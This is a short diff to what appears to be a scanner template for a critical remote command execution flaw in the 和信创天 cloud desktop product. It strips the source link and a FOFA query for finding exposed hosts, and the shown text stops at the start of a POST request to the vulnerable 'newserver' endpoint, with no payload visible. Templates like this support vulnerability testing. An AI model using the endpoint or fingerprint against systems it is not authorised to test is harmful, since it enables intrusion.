@@ -3,12 +3,8 @@ info:
   name: 和信创天云桌面系统 newserver 远程命令执行
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wpxwo563vffzg0di'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wpxwo563vffzg0di
-    fofa: body="信下一代云桌面VENGD"
 http:
 - raw:
   - 'POST /vesystem/index.php/New/Fn/newserver HTTP/1.1
